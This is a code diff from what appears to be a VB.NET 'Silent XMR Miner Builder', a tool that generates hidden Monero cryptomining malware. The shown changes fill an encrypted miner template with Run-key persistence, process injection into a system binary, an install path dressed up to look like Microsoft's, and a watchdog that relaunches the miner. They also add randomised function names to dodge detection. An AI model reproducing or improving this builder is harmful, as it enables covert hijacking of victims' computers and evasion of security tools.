@@ -20,7 +20,7 @@ Public Class Form1
 
     Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
         Try
-            MephForm1.Text = "Silent XMR Miner Builder 1.0.3"
+            MephForm1.Text = "Silent XMR Miner Builder 1.1"
         Catch ex As Exception
         End Try
 
@@ -99,12 +99,22 @@ Public Class Form1
             minerbuilder.Replace("#KEY", AESKEY)
             minerbuilder.Replace("#SALT", SALT)
             minerbuilder.Replace("#IV", IV)
-            minerbuilder.Replace("#LIBSPATH", EncryptString("WinCFG\Libs\"))
+            minerbuilder.Replace("#LIBSPATH", EncryptString("Microsoft\Libs\"))
             minerbuilder.Replace("#DLLSTR", EncryptString("Project1.Program"))
             minerbuilder.Replace("#DLLOAD", EncryptString("Load"))
             minerbuilder.Replace("#REGKEY", EncryptString("Software\Microsoft\Windows\CurrentVersion\Run\"))
             minerbuilder.Replace("#InjectionTarget", EncryptString(InjectionTarget(0)))
             minerbuilder.Replace("#InjectionDir", EncryptString(InjectionTarget(1).Replace("(", "").Replace(")", "").Replace("%WINDIR%", Environment.GetFolderPath(Environment.SpecialFolder.Windows))))
+
+            minerbuilder.Replace("RInstall", Randomi(rand.Next(5, 40)))
+            minerbuilder.Replace("RGetTheResource", Randomi(rand.Next(5, 40)))
+            minerbuilder.Replace("RGetString", Randomi(rand.Next(5, 40)))
+            minerbuilder.Replace("RRun", Randomi(rand.Next(5, 40)))
+            minerbuilder.Replace("RBaseFolder", Randomi(rand.Next(5, 40)))
+            minerbuilder.Replace("RCheckProc", Randomi(rand.Next(5, 40)))
+            minerbuilder.Replace("RInitialize", Randomi(rand.Next(5, 40)))
+            minerbuilder.Replace("RGetGPU", Randomi(rand.Next(5, 40)))
+            minerbuilder.Replace("RAES_Decryptor", Randomi(rand.Next(5, 40)))
 
             If toggleEnableIdle.Checked Then
                 argstr += " --unam-idle-wait=" & txtIdleWait.Text & " --unam-idle-cpu=" & txtIdleCPU.Text.Replace("%", "") & " "
@@ -129,18 +139,20 @@ Public Class Form1
             minerbuilder.Replace("#ARGSTR", EncryptString(argstr))
 
             If toggleEnableGPU.Checked Then
-                minerbuilder.Replace("#Const EnableGPU = False", "#Const EnableGPU = True")
+                minerbuilder.Replace("DefGPU", "true")
+            Else
+                minerbuilder.Replace("DefGPU", "false")
             End If
 
             If chkInstall.Checked Then
                 txtLog.Text = txtLog.Text + ("Adding install... " + vbNewLine)
-                minerbuilder.Replace("#Const INS = False", "#Const INS = True")
+                minerbuilder.Replace("DefInstall", "true")
                 minerbuilder.Replace("PayloadPath", "System.IO.Path.Combine(Microsoft.VisualBasic.Interaction.Environ(" & Chr(34) & txtInstallPathMain.Text & Chr(34) & ")," & Chr(34) & txtInstallFileName.Text & Chr(34) & ")")
 
                 If toggleWatchdog.Checked Then
 
                     txtLog.Text = txtLog.Text + ("Compiling Watchdog..." + vbNewLine)
-                    minerbuilder.Replace("#Const WD = False", "#Const WD = True")
+                    minerbuilder.Replace("DefWatchdog", "true")
 
                     Dim WatchdogSource = My.Resources.Watchdog
                     Dim watchdogbuilder As New StringBuilder(WatchdogSource)
@@ -152,24 +164,33 @@ Public Class Form1
                     watchdogbuilder.Replace("#STARTDELAY", txtStartDelay.Text)
                     watchdogbuilder.Replace("PayloadPath", "System.IO.Path.Combine(Microsoft.VisualBasic.Interaction.Environ(" & Chr(34) & txtInstallPathMain.Text & Chr(34) & ")," & Chr(34) & txtInstallFileName.Text & Chr(34) & ")")
 
+                    watchdogbuilder.Replace("RWDLoop", Randomi(rand.Next(5, 40)))
+                    watchdogbuilder.Replace("RAES_Encryptor", Randomi(rand.Next(5, 40)))
+                    watchdogbuilder.Replace("RAES_Decryptor", Randomi(rand.Next(5, 40)))
+                    watchdogbuilder.Replace("RGetString", Randomi(rand.Next(5, 40)))
+                    watchdogbuilder.Replace("RCheckProc", Randomi(rand.Next(5, 40)))
+
                     WatchdogSource = watchdogbuilder.ToString()
 
                     Codedom.WatchdogCompiler(OutputPayload & "-watchdog", WatchdogSource)
 
                     If Codedom.WatchdogOK Then
                         txtLog.Text = txtLog.Text + ("Compiled Watchdog!" + vbNewLine)
-                        watchdogdata = File.ReadAllBytes(OutputPayload & "-watchdog.exe")
-                        File.Delete(OutputPayload & "-watchdog.exe")
+                        watchdogdata = File.ReadAllBytes(OutputPayload & "-watchdog")
+                        File.Delete(OutputPayload & "-watchdog")
                     Else
                         txtLog.Text = txtLog.Text + ("Error compiling Watchdog!" + vbNewLine)
                     End If
+                Else
+                    minerbuilder.Replace("DefWatchdog", "true")
                 End If
-
+            Else
+                minerbuilder.Replace("DefInstall", "false")
             End If
 
             If chkAssembly.Checked Then
                 txtLog.Text = txtLog.Text + ("Writing Assembly Information..." + vbNewLine)
-                minerbuilder.Replace("#Const Assembly = False", "#Const Assembly = True")
+                minerbuilder.Replace("DefAssembly", "true")
 
                 minerbuilder.Replace("%Title%", txtTitle.Text)
                 minerbuilder.Replace("%Description%", txtDescription.Text)
@@ -182,6 +203,8 @@ Public Class Form1
                 minerbuilder.Replace("%v3%", num_Assembly3.Text)
                 minerbuilder.Replace("%v4%", num_Assembly4.Text)
                 minerbuilder.Replace("%Guid%", Guid.NewGuid.ToString)
+            Else
+                minerbuilder.Replace("DefAssembly", "false")
             End If
 
             MinerSource = minerbuilder.ToString
